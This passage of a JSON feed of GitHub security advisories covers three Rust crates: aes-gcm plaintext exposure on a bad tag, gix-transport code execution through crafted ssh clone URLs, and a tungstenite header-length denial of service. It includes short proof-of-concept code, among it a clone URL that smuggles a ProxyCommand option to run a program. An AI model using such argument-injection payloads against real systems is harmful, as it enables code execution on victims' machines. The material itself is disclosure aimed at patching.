href=\"https://docs.rs/aes-gcm-siv/latest/src/aes_gcm_siv/lib.rs.html#307\">AES GCM SIV implementation</a>, where the decrypted buffer is encrypted again before the error is returned - this fix is straightforward to implement in AES GCM. To ensure that these types of cases are covered during testing, it would be valuable to add test cases like <a href=\"https://github.com/google/wycheproof/blob/master/testvectors/aes_gcm_test.json#L288\">23, 24 </a>etc from <a href=\"https://github.com/google/wycheproof\">project wycheproof </a>to ensure that when a bad tag is used, there is an error on decryption <em><strong>and</strong></em> that the plaintext value is not exposed. </p>\n<h3 id=\"poc\">PoC</h3>\n<p>To reproduce this issue, I'm using <a href=\"https://github.com/google/wycheproof/blob/master/testvectors/aes_gcm_test.json#L288\">test case 23</a> from project wycheproof. </p>\n<pre><code class=\"language-rust\">    let key = GenericArray::from_slice(&amp;hex!(\"000102030405060708090a0b0c0d0e0f\"));\n    let nonce = GenericArray::from_slice(&amp;hex!(\"505152535455565758595a5b\"));\n    let tag = GenericArray::from_slice(&amp;hex!(\"d9847dbc326a06e988c77ad3863e6083\")); // bad tag\n    let mut ct = hex!(\"eb156d081ed6b6b55f4612f021d87b39\");\n    let msg = hex!(\"202122232425262728292a2b2c2d2e2f\");\n    let aad = hex!(\"\");\n    let cipher = Aes128Gcm::new(&amp;key);\n    let _plaintext = cipher.decrypt_in_place_detached(&amp;nonce, &amp;aad, &amp;mut ct, &amp;tag);\n    assert_eq!(ct, msg);\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/RustCrypto/AEADs/security/advisories/GHSA-423w-p2w9-r7vq\">https://github.com/RustCrypto/AEADs/security/advisories/GHSA-423w-p2w9-r7vq</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-42811\">https://nvd.nist.gov/vuln/detail/CVE-2023-42811</a></li>\n<li><a href=\"https://docs.rs/aes-gcm/latest/src/aes_gcm/lib.rs.html#309\">https://docs.rs/aes-gcm/latest/src/aes_gcm/lib.rs.html#309</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ROBB6TBDAGEQ2WIINR34F3DPSN3FND6K/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ROBB6TBDAGEQ2WIINR34F3DPSN3FND6K/</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/RYQCICN6BVC6I75O3F6W4VK4J3MOYDJU/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/RYQCICN6BVC6I75O3F6W4VK4J3MOYDJU/</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/U67ZSMNX5V3WTBYPUYF45PSFG4SF5SGF/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/U67ZSMNX5V3WTBYPUYF45PSFG4SF5SGF/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-423w-p2w9-r7vq\">https://github.com/advisories/GHSA-423w-p2w9-r7vq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-423w-p2w9-r7vq",
            "title": "[aes-gcm] AEADs/aes-gcm: Plaintext exposed in decrypt_in_place_detached even on tag verification failure",
            "date_modified": "2023-10-03T21:28:22.000Z",
            "date_published": "2023-09-22T16:11:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-423w-p2w9-r7vq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The <code>gix-transport</code> crate prior to the patched version 0.36.1 would allow attackers to use malicious ssh clone URLs to pass arbitrary arguments to the <code>ssh</code> program, leading to arbitrary code execution.</p>\n<p>PoC: <code>gix clone 'ssh://-oProxyCommand=open$IFS-aCalculator/foo'</code></p>\n<p>This will launch a calculator on OSX.</p>\n<p>See <a href=\"https://secure.phabricator.com/T12961\">https://secure.phabricator.com/T12961</a> for more details on similar vulnerabilities in <code>git</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Byron/gitoxide/pull/1032\">https://github.com/Byron/gitoxide/pull/1032</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2023-0064.html\">https://rustsec.org/advisories/RUSTSEC-2023-0064.html</a></li>\n<li><a href=\"https://secure.phabricator.com/T12961\">https://secure.phabricator.com/T12961</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rrjw-j4m2-mf34\">https://github.com/advisories/GHSA-rrjw-j4m2-mf34</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rrjw-j4m2-mf34",
            "title": "[gix-transport] gix-transport code execution vulnerability",
            "date_modified": "2023-09-25T20:21:17.000Z",
            "date_published": "2023-09-25T20:21:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rrjw-j4m2-mf34"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The Tungstenite crate through 0.20.0 for Rust allows remote attackers to cause a denial of service (minutes of CPU consumption) via an excessive length of an HTTP header in a client handshake. The length affects both how many times a parse is attempted (e.g., thousands of times) and the average amount of data for each parse attempt (e.g., millions of bytes).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-43669\">https://nvd.nist.gov/vuln/detail/CVE-2023-43669</a></li>\n<li><a href=\"https://github.com/snapview/tungstenite-rs/issues/376\">https://github.com/snapview/tungstenite-rs/issues/376</a></li>\n<li><a href=\"https://crates.io/crates/tungstenite/versions\">https://crates.io/crates/tungstenite/versions</a></li>\n<li><a href=\"https://cwe.mitre.org/data/definitions/407.html\">https://cwe.mitre.org/data/definitions/407.html</a></li>\n<li><a href=\"https://github.com/github/advisory-database/pull/2752\">https://github.com/github/advisory-database/pull/2752</a></li>\n<li><a href=\"https://github.com/snapview/tungstenite-rs/pull/379\">https://github.com/snapview/tungstenite-rs/pull/379</a></li>\n<li><a href=\"https://github.com/snapview/tungstenite-rs/commit/8b3ecd3cc0008145ab4bc8d0657c39d09db8c7e2\">https://github.com/snapview/tungstenite-rs/commit/8b3ecd3cc0008145ab4bc8d0657c39d09db8c7e2</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2240110\">https://bugzilla.redhat.com/show_bug.cgi?id=2240110</a></li>\n<li><a href=\"https://bugzilla.suse.com/show_bug.cgi?id=1215563\">https://bugzilla.suse.com/show_bug.cgi?id=1215563</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9mcr-873m-xcxp\">https://github.com/advisories/GHSA-9mcr-873m-xcxp</a></li>\n<li><a href=\"https://security-tracker.debian.org/tracker/CVE-2023-43669\">https://security-tracker.debian.org/tracker/CVE-2023-43669</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/THK6G6CD4VW6RCROWUV2C4HSINKK3XAK/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/THK6G6CD4VW6RCROWUV2C4HSINKK3XAK/</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2023-0065.html\">https://rustsec.org/advisories/RUSTSEC-2023-0065.html</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/R77EUWPZVP5WSMNXUXUDNHR7G7OI5NGM/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/R77EUWPZVP5WSMNXUXUDNHR7G7OI5NGM/</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TT7SF6CQ5VHAGFLWNXY64NFSW4WIWE7D/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TT7SF6CQ5VHAGFLWNXY64NFSW4WIWE7D/</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9mcr-873m-xcxp",
            "title": "[tungstenite] Tungstenite allows remote attackers to cause a denial of service",
            "date_modified": "2023-10-03T21:27:19.000Z",
            "date_published": "2023-09-21T06:30:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9mcr-873m-xcxp"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}